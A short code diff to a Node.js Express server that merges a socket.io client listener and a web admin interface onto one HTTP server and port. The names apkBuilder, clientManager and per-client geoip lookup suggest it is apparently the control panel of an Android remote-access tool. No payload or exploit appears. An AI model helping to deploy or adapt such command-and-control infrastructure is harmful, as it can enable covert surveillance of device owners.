@@ -8,7 +8,8 @@
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    server = require('http').createServer(app),
+    IO = require('socket.io')(server),
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
@@ -24,10 +25,11 @@ global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
 // spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// let client_io = IO.listen(CONST.control_port);
 
-client_io.sockets.pingInterval = 30000;
-client_io.on('connection', (socket) => {
+// client_io.sockets.pingInterval = 30000;
+IO.sockets.pingInterval = 30000;
+IO.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
     let clientAddress = socket.request.connection;
@@ -65,7 +67,8 @@ client_io.on('connection', (socket) => {
 
 
 // get the admin interface online
-app.listen(CONST.web_port);
+// app.listen(CONST.web_port);
+server.listen(process.env.PORT || CONST.web_port)
 
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
